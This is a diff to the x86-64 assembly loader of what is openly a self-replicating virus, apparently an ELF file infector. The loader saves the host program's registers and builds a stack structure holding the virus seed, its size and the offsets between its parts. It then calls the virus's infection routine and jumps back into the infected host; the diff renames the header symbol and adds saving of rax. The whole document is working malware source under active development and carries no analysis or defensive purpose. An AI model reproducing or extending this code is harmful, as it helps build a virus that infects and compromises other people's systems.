@@ -3,14 +3,15 @@ section .text
 	global call_virus
 	global jump_back_to_client
 	global loader_exit
-	global virus_header_struct
+	global virus_header
 
 extern virus
 
-;----------------------------------; backup all swappable registers
-;                                    (all but rax, rsp, rbp)
+;----------------------------------; backup all swappable registers and flags
+;                                    (all but rsp and rbp)
 loader_entry:
 	pushfq                     ; backup flags
+	push rax                   ; backup rax
 	push rcx                   ; backup rcx
 	push rdx                   ; backup rdx
 	push rbx                   ; backup rbx
@@ -42,37 +43,37 @@ loader_entry:
 ;----------------------------------; launch infection routines
 
 ; allocate space for structure fields
-	sub rsp, end_virus_header - virus_header_struct
+	sub rsp, end_virus_header - virus_header
 
 ; dist_jmpclient_loader
-	lea rcx, [rel virus_header_struct + 0x38]
+	lea rcx, [rel virus_header + 0x38]
 	mov rcx, [rcx]
 	mov [rsp + 0x38], rcx
 ; dist_header_loader
-	lea rdx, [rel virus_header_struct + 0x30]
+	lea rdx, [rel virus_header + 0x30]
 	mov rdx, [rdx]
 	mov [rsp + 0x30], rdx
 ; dist_vircall_loader
-	lea rbx, [rel virus_header_struct + 0x28]
+	lea rbx, [rel virus_header + 0x28]
 	mov rbx, [rbx]
 	mov [rsp + 0x28], rbx
 ; dist_virus_loader
-	lea rsi, [rel virus_header_struct + 0x20]
+	lea rsi, [rel virus_header + 0x20]
 	mov rsi, [rsi]
 	mov [rsp + 0x20], rsi
 ; loader_size
-	lea rdi, [rel virus_header_struct + 0x18]
+	lea rdi, [rel virus_header + 0x18]
 	mov rdi, [rdi]
 	mov [rsp + 0x18], rdi
 ; loader_entry
 	lea r8, [rel loader_entry]
 	mov [rsp + 0x10], r8
 ; virus_size
-	lea r9, [rel virus_header_struct + 0x8]
+	lea r9, [rel virus_header + 0x8]
 	mov r9, [r9]
 	mov [rsp + 0x8], r9
 ; seed
-	lea r10, [rel virus_header_struct]
+	lea r10, [rel virus_header]
 	mov r10, [r10]
 	mov [rsp], r10
 ; pass structure address
@@ -81,7 +82,7 @@ call_virus:
 	call virus                 ; address rewritten by virus
 
 ; free structure fields space
-	add rsp, end_virus_header - virus_header_struct
+	add rsp, end_virus_header - virus_header
 
 ;----------------------------------; restore registers
 
@@ -99,12 +100,13 @@ return_to_client:
 	pop rbx                    ; restore rbx
 	pop rdx                    ; restore rdx
 	pop rcx                    ; restore rcx
+	pop rax                    ; restore rax
 	popfq                      ; restore flags
 jump_back_to_client:
 	jmp 0xffffffff             ; address rewritten by virus
 loader_exit:
 
-virus_header_struct:
+virus_header:
 	db 0xD5, 0xEE, 0xF5, 0xE1, 0xAD, 0xDB, 0xDE, 0xFA ; virus seed (placeholder)
 	dq loader_entry                                   ; virus size (placeholder)
 	dq loader_entry                                   ; loader entry (placeholder)
